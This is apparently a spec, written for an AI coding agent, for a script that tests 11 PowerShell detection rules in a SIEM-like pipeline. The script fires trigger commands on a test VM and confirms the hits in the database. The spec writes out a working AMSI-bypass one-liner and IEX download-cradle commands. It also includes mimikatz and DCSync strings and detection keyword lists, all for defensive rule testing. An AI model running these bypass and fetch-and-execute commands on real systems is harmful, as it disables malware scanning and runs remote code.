# SHADOWSENSOR — PHASE 7A SUBPHASE 1 SIMULATION SCRIPT
# Authorized by: Ayush
# Executor: Cursor Grok 4.5
# Role: Executor only. No judgment calls. No unrequested changes.

---

## PREREQUISITE READING (read all three fully before writing a single line of code)

1. rule_insights.md — project root — source of truth for every rule ID,
   condition value, and attack path. Every field value in this script
   comes from rule_insights.md exactly. If a value is not in
   rule_insights.md, STOP and report — do not invent it.

2. rules/engine.py — read _evaluate_condition and every _op_* function.
   Understand: the engine lowercases both field values and condition
   values before comparison. parent_image allow_null: true means
   a None parent satisfies the not_contains_any exclusion condition.

3. rules/definitions/powershell.yaml — confirm each rule's live
   condition block matches the values listed in this task before writing
   that rule's section. If any mismatch is found, STOP and report.

---

## FROZEN FILES (never touch — not for reading context, not for any edit)

- collector/ (entire directory)
- normalizer/ (entire directory)
- storage/database.py, storage/models.py, storage/storage_writer.py
- alerting/ (entire directory)
- scripts/run_pipeline.py
- docs/decisions_log.md
- status.md
- progress_log.md
- VM_RUN_GUIDE.md
- rules/ (entire directory — no yaml or engine edits)
- data/features/ (no CSV edits or deletions)
- Any file not listed explicitly in Permitted Files below

## PERMITTED FILES — THIS TASK ONLY

- scripts/simulate_subphase_1.py  ← CREATE THIS FILE (new, does not exist)
- exports/ directory at project root ← CREATE if missing

---

## AMBIGUITY RULE

If anything in this document is unclear, unexpected, or not explicitly
covered: STOP. Report the exact issue. Do not proceed. Do not assume.
Do not infer. Do not fill gaps with judgment.

---

## TASK

Write one Python script: scripts/simulate_subphase_1.py

Script location on VM: Z:\scripts\simulate_subphase_1.py
Run command on VM:
  Z:\python_runtime\python.exe Z:\scripts\simulate_subphase_1.py

This script tests all 11 powershell.yaml rules by launching real
powershell.exe commands via subprocess.run(). ShadowSensor's live
pipeline (Sysmon → normalizer → rule engine → SQLite DB) must be
running when this script executes. The script does NOT start or stop
the pipeline — it assumes the pipeline is already running.

After each command, the script waits 4 seconds then queries the DB to
confirm the rule fired. Results are logged to a staging CSV.

---

## SYSTEM PATHS (use exactly as written — no substitution)

- DB: C:\ShadowSensor\data\shadowsensor.db
- Exports dir: Z:\exports\
- Script output file: Z:\scripts\simulate_subphase_1.py

---

## SCRIPT STRUCTURE (implement in this exact order)

### BLOCK 0 — Imports and Setup

```python
import subprocess, datetime, time, sqlite3, csv, os, sys

EXPORTS_DIR = r"Z:\exports"
DB_PATH = r"C:\ShadowSensor\data\shadowsensor.db"
os.makedirs(EXPORTS_DIR, exist_ok=True)

print("=" * 60)
print("ShadowSensor Phase 7A — Subphase 1: PowerShell Simulation")
print("=" * 60)
print("PREREQUISITE: Confirm pipeline is running before this script.")
print(f"Script UTC start: {datetime.datetime.utcnow().isoformat()}")
```

Do NOT use Add-Type anywhere in this script. Do NOT use C# compilation
(csc.exe, cvtres.exe). Use subprocess.run() with powershell.exe only.

### BLOCK 1 — DB helper

```python
def hits_since(rule_id: str, since: datetime.datetime) -> int:
    conn = sqlite3.connect(DB_PATH)
    n = conn.execute(
        "SELECT COUNT(*) FROM rule_hits WHERE rule_id=? AND timestamp>=?",
        (rule_id, since.strftime("%Y-%m-%d %H:%M:%S"))
    ).fetchone()[0]
    conn.close()
    return n
```

### BLOCK 2 — Launch helper

```python
def ps(cmd: str, label: str) -> None:
    print(f"  [LAUNCH] {label}")
    print(f"  [CMD]    powershell.exe -Command \"{cmd}\"")
    subprocess.run(["powershell.exe", "-Command", cmd],
                   capture_output=True, timeout=20)
    time.sleep(4)
```

### BLOCK 3 — Results accumulator

```python
results = []  # list of dicts — written to CSV at end
```

### BLOCK 4 — Simulation window start

```python
SIM_START = datetime.datetime.utcnow()
print(f"\nSimulation window start (UTC): {SIM_START.isoformat()}\n")
```

---

## RULE SIMULATIONS

Implement each rule in the order below. For every rule:
- Print a banner: === RULE_ID ===
- Record a per-rule start timestamp
- Run each path
- After each path: query DB, print PASS or FAIL with hit count
- Append one results dict per (rule_id, path) to results[]

results dict format:
{
  "rule_id": str,
  "attack_path": str,          # e.g. "Path A"
  "field_values_used": str,    # brief description of command used
  "result": str,               # "PASS" | "FAIL" | "PARTIAL" | "SKIP"
  "reason": str,               # e.g. "2 hits" or "DEFENDER_BLOCKED"
  "timestamp_utc": str         # ISO format UTC of path execution
}

---

### RULE 1: PS_ENCODED_CMD_001

Conditions from rule_insights.md (confirm against live YAML before writing):
  image: ends_with "powershell.exe"
  command_line: contains_any "-EncodedCommand" | "-enc " | "-ec "
Exclusions: none. FP suppression: NOT APPLICABLE. Defender-blocked: NO.

PATH A — trigger value: "-EncodedCommand"
  Launch 1: powershell.exe -EncodedCommand SQBFAFgA
  Launch 2: powershell.exe -EncodedCommand JABjAG0AZAAgACcAVABlAHMAdAAnAA==
  (2 launches — different base64 payloads — both satisfy "-EncodedCommand")
  Record path_start before Launch 1. After both launches + sleeps:
    n = hits_since("PS_ENCODED_CMD_001", path_start)
    PASS if n >= 2, FAIL otherwise. Print n.

PATH B — trigger value: "-enc " (with trailing space — exact condition string)
  Launch 1: powershell.exe -enc SQBFAFgA
  Launch 2: powershell.exe -enc JABjAG0AZAAgACcAVABlAHMAdAAnAA==
  PASS if n >= 2 since path_start.

PATH C — trigger value: "-ec " (with trailing space — exact condition string)
  Launch 1: powershell.exe -ec SQBFAFgA
  Launch 2: powershell.exe -ec JABjAG0AZAAgACcAVABlAHMAdAAnAA==
  PASS if n >= 2 since path_start.

---

### RULE 2: PS_DOWNLOAD_CRADLE_001

Conditions from rule_insights.md:
  image: ends_with "powershell.exe"
  command_line: contains_any "DownloadString" | "DownloadFile" | "WebClient" |
    "Invoke-WebRequest" | "iwr " | "curl " | "wget "
  parent_image: not_contains_any "explorer.exe" | "taskeng.exe" |
    "taskhostw.exe" | "svchost.exe"  [allow_null: true]
Defender-blocked: NO.

*** FP SUPPRESSION TEST — REQUIRED (this rule has parent exclusion) ***

Before running TP paths, run this FP test.
Goal: fire the trigger command from svchost.exe as parent.
svchost.exe is in the exclusion list — rule must stay SILENT.

fp_start = datetime.datetime.utcnow()

Step 1: Create a scheduled task that runs immediately.
  subprocess.run([
    "schtasks.exe", "/create", "/tn", "ShadowSensorFPTest1",
    "/tr", "powershell.exe -Command \"New-Object Net.WebClient\"",
    "/sc", "once", "/st",
    (datetime.datetime.now() + datetime.timedelta(minutes=1)).strftime("%H:%M"),
    "/f"
  ], capture_output=True)

Step 2: Run the task immediately.
  subprocess.run(["schtasks.exe", "/run", "/tn", "ShadowSensorFPTest1"],
                 capture_output=True)
  time.sleep(6)

Step 3: Delete the task.
  subprocess.run(["schtasks.exe", "/delete", "/tn", "ShadowSensorFPTest1",
                  "/f"], capture_output=True)

Step 4: Query DB.
  n = hits_since("PS_DOWNLOAD_CRADLE_001", fp_start)
  If n == 0: print "FP_SUPPRESSION: PASS — rule silent (svchost.exe parent excluded)"
  If n > 0: print "FP_SUPPRESSION: FAIL — rule fired when it should not have"
            STOP. Print this message and exit(1):
            "HARD STOP: FP suppression failed for PS_DOWNLOAD_CRADLE_001.
             Report to Ayush before proceeding."

*** TP PATHS (run only after FP suppression PASS) ***

PATH A — trigger values: "DownloadString", "WebClient"
  Launch 1: powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/test')"
  Launch 2: powershell.exe -Command "(New-Object Net.WebClient).DownloadString('http://8.8.8.8/test')"
  PASS if n >= 2 since path_start.

PATH B — trigger values: "iwr " and "Invoke-WebRequest"
  Launch 1: powershell.exe -Command "iwr http://127.0.0.1/test -ErrorAction SilentlyContinue"
  Launch 2: powershell.exe -Command "Invoke-WebRequest http://127.0.0.1/test -ErrorAction SilentlyContinue"
  (Launch 1 satisfies "iwr "; Launch 2 satisfies "Invoke-WebRequest")
  PASS if n >= 2 since path_start.

PATH C — trigger values: "curl " and "wget "
  Launch 1: powershell.exe -Command "curl http://127.0.0.1/test -ErrorAction SilentlyContinue"
  Launch 2: powershell.exe -Command "wget http://127.0.0.1/test -ErrorAction SilentlyContinue"
  PASS if n >= 2 since path_start.

---

### RULE 3: PS_AMSI_BYPASS_001

Conditions from rule_insights.md:
  image: ends_with "powershell.exe"
  command_line: contains_any "amsiInitFailed" | "AmsiScanBuffer" |
    "AmsiUtils" | "amsi.dll"
Exclusions: none. FP suppression: NOT APPLICABLE.
DEFENDER_BLOCKED: YES — documented D-f limitation (committee.md §20).
Expected behavior: Defender intercepts at kernel level before Sysmon
logs ProcessCreate. All paths expected to produce 0 DB hits.
Do NOT mark as FAIL. Mark as PARTIAL — DEFENDER_BLOCKED.

Print at rule banner:
"NOTE: PS_AMSI_BYPASS_001 — expected PARTIAL/DEFENDER_BLOCKED per D-f.
 Attempting all paths. 0 hits = expected. Any hit = log as PASS."

PATH A — trigger value: "amsiInitFailed"
  Launch: powershell.exe -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
  Query DB. If n > 0: PASS. If n == 0: PARTIAL — DEFENDER_BLOCKED (expected).

PATH B — trigger value: "AmsiScanBuffer"
  Launch: powershell.exe -Command "[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').GetValue($null),0x0)"
  Query DB. PASS if n > 0, else PARTIAL — DEFENDER_BLOCKED.

PATH C — trigger value: "AmsiUtils"
  Launch: powershell.exe -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
  Query DB. PASS if n > 0, else PARTIAL — DEFENDER_BLOCKED.

Overall rule result: PARTIAL — DEFENDER_BLOCKED (expected per D-f).

---

### RULE 4: PS_HIDDEN_WINDOW_001

Conditions from rule_insights.md:
  image: ends_with "powershell.exe"
  command_line: contains_any "-WindowStyle Hidden" | "-W Hidden" | "-WindowStyle H"
  parent_image: not_contains_any "taskeng.exe" | "taskhostw.exe" | "svchost.exe"
    [allow_null: true]
Defender-blocked: NO.

*** FP SUPPRESSION TEST — REQUIRED ***

fp2_start = datetime.datetime.utcnow()
Create scheduled task "ShadowSensorFPTest2":
  tr: powershell.exe -WindowStyle Hidden -Command "Write-Host test"
  Parent will be svchost.exe — in exclusion list — rule must stay SILENT.

Use same schtasks create/run/delete pattern as FP test 1 above.
time.sleep(6) after run.

n = hits_since("PS_HIDDEN_WINDOW_001", fp2_start)
If n == 0: print "FP_SUPPRESSION: PASS — rule silent (svchost.exe parent excluded)"
If n > 0: HARD STOP — print message and exit(1):
  "HARD STOP: FP suppression failed for PS_HIDDEN_WINDOW_001.
   Report to Ayush before proceeding."

*** TP PATHS ***

PATH A — trigger value: "-WindowStyle Hidden"
  Launch 1: powershell.exe -WindowStyle Hidden -Command "Write-Host ShadowSensor_test_1"
  Launch 2: powershell.exe -WindowStyle Hidden -NoProfile -Command "Write-Host ShadowSensor_test_2"
  PASS if n >= 2 since path_start.

PATH B — trigger value: "-W Hidden"
  Launch 1: powershell.exe -W Hidden -Command "Write-Host ShadowSensor_test_3"
  Launch 2: powershell.exe -W Hidden -NonInteractive -Command "Write-Host ShadowSensor_test_4"
  PASS if n >= 2 since path_start.

PATH C — trigger value: "-WindowStyle H"
  Launch 1: powershell.exe -WindowStyle H -Command "Write-Host ShadowSensor_test_5"
  Launch 2: powershell.exe -WindowStyle H -NoProfile -Command "Write-Host ShadowSensor_test_6"
  PASS if n >= 2 since path_start.

---

### RULE 5: PS_EXECUTION_POLICY_BYPASS_001

Conditions from rule_insights.md:
  image: ends_with "powershell.exe"
  command_line: contains_any "-executionpolicy bypass" | "-ep bypass" |
    "-executionpolicy unrestricted"
  (Engine lowercases both sides — any case in command is acceptable)
Exclusions: none. FP suppression: NOT APPLICABLE. Defender-blocked: NO.

PATH A — trigger value: "-executionpolicy bypass"
  Launch 1: powershell.exe -ExecutionPolicy Bypass -Command "Write-Host test_a1"
  Launch 2: powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Write-Host test_a2"
  PASS if n >= 2 since path_start.

PATH B — trigger value: "-ep bypass"
  Launch 1: powershell.exe -ep bypass -Command "Write-Host test_b1"
  Launch 2: powershell.exe -ep bypass -NonInteractive -Command "Write-Host test_b2"
  PASS if n >= 2 since path_start.

PATH C — trigger value: "-executionpolicy unrestricted"
  Launch 1: powershell.exe -ExecutionPolicy Unrestricted -Command "Write-Host test_c1"
  Launch 2: powershell.exe -ExecutionPolicy Unrestricted -NoProfile -Command "Write-Host test_c2"
  PASS if n >= 2 since path_start.

---

### RULE 6: PS_INVOKE_EXPRESSION_001

*** CRITICAL — TWO-CONDITION RULE ***
This rule has TWO separate contains_any conditions. BOTH must be satisfied
by the same command_line. A command_line satisfying only one condition
does NOT fire this rule.

Condition 1 (IEX family) — command_line must contain at least one of:
  "invoke-expression" | "iex(" | "iex (" | "|iex" | "| iex" | ".invoke()"

Condition 2 (download/decode family) — command_line must ALSO contain
at least one of:
  "frombase64string" | "downloadstring" | "net.webclient" | "webclient" |
  "downloadfile" | "net.sockets" | "[char[]"

Every command in every path MUST satisfy BOTH conditions simultaneously.
Verify this for each command before writing it.

Exclusions: none. FP suppression: NOT APPLICABLE. Defender-blocked: NO.

PATH A — Condition 1: "iex (" | Condition 2: "downloadstring"
  Launch 1: powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/test')"
    (satisfies "iex (" AND "downloadstring" — confirm both present)
  Launch 2: powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/test')"
    (same — different URL for additional DB hit)
  PASS if n >= 2 since path_start.

PATH B — Condition 1: "|iex" | Condition 2: "frombase64string"
  Launch 1: powershell.exe -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dGVzdA=='))|iex"
    (satisfies "|iex" AND "frombase64string" — confirm both present)
  Launch 2: powershell.exe -Command "[Convert]::FromBase64String('aGVsbG8=')|iex"
    (same — different base64 payload)
  PASS if n >= 2 since path_start.

PATH C — Condition 1: "invoke-expression" | Condition 2: "webclient" and "downloadstring"
  Launch 1: powershell.exe -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://127.0.0.1/x')"
    (satisfies "invoke-expression" AND "webclient" AND "downloadstring")
  Launch 2: powershell.exe -Command "Invoke-Expression ((New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/t','C:\Windows\Temp\t.txt'))"
    (satisfies "invoke-expression" AND "webclient" AND "downloadfile")
  PASS if n >= 2 since path_start.

---

### RULE 7: PS_VERSION_DOWNGRADE_001

Conditions from rule_insights.md:
  image: ends_with "powershell.exe"
  command_line: contains_any "-version 2" | "-version 2.0" | "-v 2" | "-ve 2"
Exclusions: none. FP suppression: NOT APPLICABLE. Defender-blocked: NO.

PATH A — trigger value: "-version 2"
  Launch 1: powershell.exe -Version 2 -Command "Write-Host test_a1"
  Launch 2: powershell.exe -Version 2 -NoProfile -Command "Write-Host test_a2"
  PASS if n >= 2 since path_start.

PATH B — trigger value: "-version 2.0"
  Launch 1: powershell.exe -Version 2.0 -Command "Write-Host test_b1"
  Launch 2: powershell.exe -Version 2.0 -NonInteractive -Command "Write-Host test_b2"
  PASS if n >= 2 since path_start.

PATH C — trigger values: "-v 2" and "-ve 2" (exact condition strings)
  Launch 1: powershell.exe -v 2 -Command "Write-Host test_c1"
    (satisfies "-v 2")
  Launch 2: powershell.exe -ve 2 -Command "Write-Host test_c2"
    (satisfies "-ve 2")
  PASS if n >= 2 since path_start.

---

### RULE 8: PS_REFLECTIVE_ASSEMBLY_001

Conditions from rule_insights.md:
  image: ends_with "powershell.exe"
  command_line: contains_any
    "[system.reflection.assembly]::load" |
    "[reflection.assembly]::load" |
    "[reflection.assembly]::loadfile" |
    "assembly]::loadfrom" |
    "loadwithpartialname" |
    "[system.reflection.assembly]::loadfile"
  (Engine lowercases — any case is acceptable in the command)
Exclusions: none. FP suppression: NOT APPLICABLE. Defender-blocked: NO.

DO NOT use Add-Type in any of these commands. Use Assembly API
calls directly via PowerShell method calls only.

PATH A — trigger values: "[system.reflection.assembly]::load" and
  "[reflection.assembly]::load"
  Launch 1: powershell.exe -Command "[System.Reflection.Assembly]::Load([byte[]]@(0,0))"
    (satisfies "[system.reflection.assembly]::load")
  Launch 2: powershell.exe -Command "[Reflection.Assembly]::Load([byte[]]@(0,0))"
    (satisfies "[reflection.assembly]::load")
  PASS if n >= 2 since path_start.

PATH B — trigger values: "[reflection.assembly]::loadfile" and
  "[system.reflection.assembly]::loadfile"
  Launch 1: powershell.exe -Command "[Reflection.Assembly]::LoadFile('C:\nonexistent.dll')"
    (satisfies "[reflection.assembly]::loadfile")
  Launch 2: powershell.exe -Command "[System.Reflection.Assembly]::LoadFile('C:\Windows\Temp\nonexistent.dll')"
    (satisfies "[system.reflection.assembly]::loadfile")
  PASS if n >= 2 since path_start.

PATH C — trigger values: "loadwithpartialname" and "assembly]::loadfrom"
  Launch 1: powershell.exe -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')"
    (satisfies "loadwithpartialname")
  Launch 2: powershell.exe -Command "[Reflection.Assembly]::LoadFrom('C:\Windows\Temp\nonexistent.dll')"
    (satisfies "assembly]::loadfrom")
  PASS if n >= 2 since path_start.

---

### RULE 9: PS_CREDENTIAL_ACCESS_001

Conditions from rule_insights.md:
  image: ends_with "powershell.exe"
  command_line: contains_any "invoke-mimikatz" | "sekurlsa" | "lsadump" |
    "out-minidump" | "get-passhashes" | "invoke-credentialinjection" |
    "mimikatz" | "privilege::debug" | "invoke-dcsync" | "dumpcreds"
DEFENDER_BLOCKED: YES — documented D-f limitation (committee.md §20).
Same behavior as PS_AMSI_BYPASS_001. Expected 0 hits per path.

Print at banner:
"NOTE: PS_CREDENTIAL_ACCESS_001 — expected PARTIAL/DEFENDER_BLOCKED per D-f."

PATH A — trigger value: "invoke-mimikatz"
  Launch: powershell.exe -Command "Write-Host 'Invoke-Mimikatz'"
  Query DB. PASS if n > 0, else PARTIAL — DEFENDER_BLOCKED (expected).

PATH B — trigger value: "sekurlsa"
  Launch: powershell.exe -Command "Write-Host 'sekurlsa::logonpasswords'"
  Query DB. PASS if n > 0, else PARTIAL — DEFENDER_BLOCKED (expected).

PATH C — trigger value: "invoke-dcsync"
  Launch: powershell.exe -Command "Write-Host 'Invoke-DCSync'"
  Query DB. PASS if n > 0, else PARTIAL — DEFENDER_BLOCKED (expected).

Overall rule result: PARTIAL — DEFENDER_BLOCKED (expected per D-f).

---

### RULE 10: PS_CONSTRAINED_LANG_BYPASS_001

Conditions from rule_insights.md:
  image: ends_with "powershell.exe"
  command_line: contains_any "__pslockdownpolicy" | "pslockdownpolicy"
  (Engine lowercases — any case acceptable)
Exclusions: none. FP suppression: NOT APPLICABLE. Defender-blocked: NO.

PATH A — trigger value: "__pslockdownpolicy"
  Launch 1: powershell.exe -Command "$env:__PSLockdownPolicy = '0'; Write-Host set"
    (satisfies "__pslockdownpolicy")
  Launch 2: powershell.exe -Command "Write-Host $env:__PSLockdownPolicy"
    (satisfies "__pslockdownpolicy")
  PASS if n >= 2 since path_start.

PATH B — trigger value: "pslockdownpolicy"
  Launch 1: powershell.exe -Command "Write-Host PSLockdownPolicy"
    (satisfies "pslockdownpolicy")
  Launch 2: powershell.exe -Command "[System.Environment]::SetEnvironmentVariable('PSLockdownPolicy','0','Process')"
    (satisfies "pslockdownpolicy")
  PASS if n >= 2 since path_start.

PATH C — additional variants (both satisfy the two condition values)
  Launch 1: powershell.exe -Command "Write-Host __pslockdownpolicy"
    (satisfies "__pslockdownpolicy")
  Launch 2: powershell.exe -Command "$x = '__PSLockdownPolicy'; Write-Host $x"
    (satisfies "__pslockdownpolicy")
  PASS if n >= 2 since path_start.

---

### RULE 11: PS_WMI_EXEC_001

Conditions from rule_insights.md:
  image: ends_with "powershell.exe"
  command_line: contains_any "win32_process" | "invoke-wmimethod" |
    "get-wmiobject" | "gwmi" | "new-object system.management" |
    "managementobject" | "[wmiclass]" | "wmic"
Exclusions: none. FP suppression: NOT APPLICABLE. Defender-blocked: NO.

PATH A — trigger values: "invoke-wmimethod" and "win32_process"
  Launch 1: powershell.exe -Command "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'notepad.exe'"
    (satisfies "invoke-wmimethod" AND "win32_process")
  Launch 2: powershell.exe -Command "Get-WmiObject Win32_Process | Select-Object Name"
    (satisfies "get-wmiobject" AND "win32_process")
  PASS if n >= 2 since path_start.

PATH B — trigger values: "get-wmiobject" and "gwmi"
  Launch 1: powershell.exe -Command "Get-WmiObject Win32_OperatingSystem"
    (satisfies "get-wmiobject")
  Launch 2: powershell.exe -Command "gwmi Win32_Process | Select-Object -First 1"
    (satisfies "gwmi")
  PASS if n >= 2 since path_start.

PATH C — trigger values: "[wmiclass]" and "new-object system.management"
  Launch 1: powershell.exe -Command "$wc = [wmiclass]'\\.\root\cimv2:Win32_Process'; Write-Host ok"
    (satisfies "[wmiclass]")
  Launch 2: powershell.exe -Command "New-Object System.Management.ManagementObject('Win32_Process')"
    (satisfies "new-object system.management" AND "managementobject")
  PASS if n >= 2 since path_start.

---

## BLOCK 5 — Simulation window end

```python
SIM_END = datetime.datetime.utcnow()
print(f"\nSimulation window end (UTC): {SIM_END.isoformat()}")
```

---

## BLOCK 6 — Summary report

Print a summary table with columns:
  RULE | PATH_A | PATH_B | PATH_C | FP_SUPPRESSION | OVERALL

Print overall counts:
  "X/11 rules PASS, Y PARTIAL (Defender-blocked), Z FAIL"

---

## BLOCK 7 — CSV export

Write to Z:\exports\subphase_1_training.csv
Use csv.DictWriter with these exact column names:
  rule_id, attack_path, field_values_used, result, reason, timestamp_utc

One row per (rule_id, attack_path) combination.
result values: "PASS" | "FAIL" | "PARTIAL" | "SKIP"
Also write one row per FP suppression test with attack_path="FP_SUPPRESSION".

Print: "Staging log written: Z:\exports\subphase_1_training.csv"

---

## BLOCK 8 — Feature extraction instructions (print only — do NOT run automatically)

The script must print these exact instructions at the end.
Do NOT execute run_feature_extraction.py from within this script.
The user will run it manually after reviewing the output above.

Python's datetime.datetime.utcnow() returns genuine UTC regardless of
VM display timezone (IST). However, per standing project convention,
use DB-queried MIN/MAX timestamps for --since/--until bounds — never
paste the script's printed SIM_START/SIM_END directly.

Print exactly:
  "======================================================"
  "NEXT STEPS — run manually after reviewing output above"
  "======================================================"
  ""
  "STEP 1 — Query DB for the confirmed UTC window of this subphase:"
  "  Open sqlite3 or run:"
  "  Z:\python_runtime\python.exe -c \""
  "  import sqlite3; conn = sqlite3.connect(r'C:\ShadowSensor\data\shadowsensor.db');"
  "  row = conn.execute(\"SELECT MIN(timestamp), MAX(timestamp) FROM rule_hits"
  "    WHERE rule_id LIKE 'PS_%' AND timestamp >= '<paste SIM_START UTC here>'\").fetchone();"
  "  print('Since:', row[0]); print('Until:', row[1]); conn.close()\""
  ""
  "STEP 2 — Run feature extraction with the DB-confirmed timestamps:"
  "  Z:\python_runtime\python.exe Z:\scripts\run_feature_extraction.py"
  "    --label 1"
  "    --since \"YYYY-MM-DD HH:MM:SS\""
  "    --until \"YYYY-MM-DD HH:MM:SS\""
  "    --output Z:\data\features\suspicious_ps.csv"
  ""
  "  Replace YYYY-MM-DD HH:MM:SS with the MIN and MAX values from STEP 1."
  "  Do NOT use VM wall-clock time. Do NOT use SIM_START/SIM_END printed above."
  "  All timestamps in the DB are UTC. run_feature_extraction.py expects UTC."

---

## HARD RULES — ANY VIOLATION REQUIRES IMMEDIATE STOP AND REPORT TO AYUSH

1. Every command_line value comes from rule_insights.md conditions exactly.
   No invented trigger values.
2. Every path label (Path A, Path B, Path C) maps to rule_insights.md entries.
3. Do NOT use Add-Type anywhere. No C# compilation. No csc.exe or cvtres.exe.
4. Do NOT touch any frozen file. Do NOT modify any YAML or engine file.
5. Do NOT start or stop the pipeline.
6. If the rule_hits table does not exist or has unexpected schema, STOP and report.
7. If any FP suppression test produces n > 0, STOP and exit(1). Report to Ayush.
8. If any TP path (non-Defender-blocked rule) produces n == 0 after 4 seconds,
   STOP and report that rule and path before continuing.
   Exception: PS_AMSI_BYPASS_001 and PS_CREDENTIAL_ACCESS_001 — n == 0 is
   expected and documented as PARTIAL — DEFENDER_BLOCKED. Do not stop for these.

---

## COMPLETION REPORT FORMAT

After writing the script, report exactly:
- Script location: Z:\scripts\simulate_subphase_1.py
- Total rules covered: 11
- Total attack paths implemented: (count A+B+C across all rules)
- Total FP suppression tests: 2 (PS_DOWNLOAD_CRADLE_001, PS_HIDDEN_WINDOW_001)
- Rules marked PARTIAL — DEFENDER_BLOCKED: PS_AMSI_BYPASS_001,
  PS_CREDENTIAL_ACCESS_001
- Any values not sourced from rule_insights.md: (list if any, else "none")

Nothing else. Hard stop.
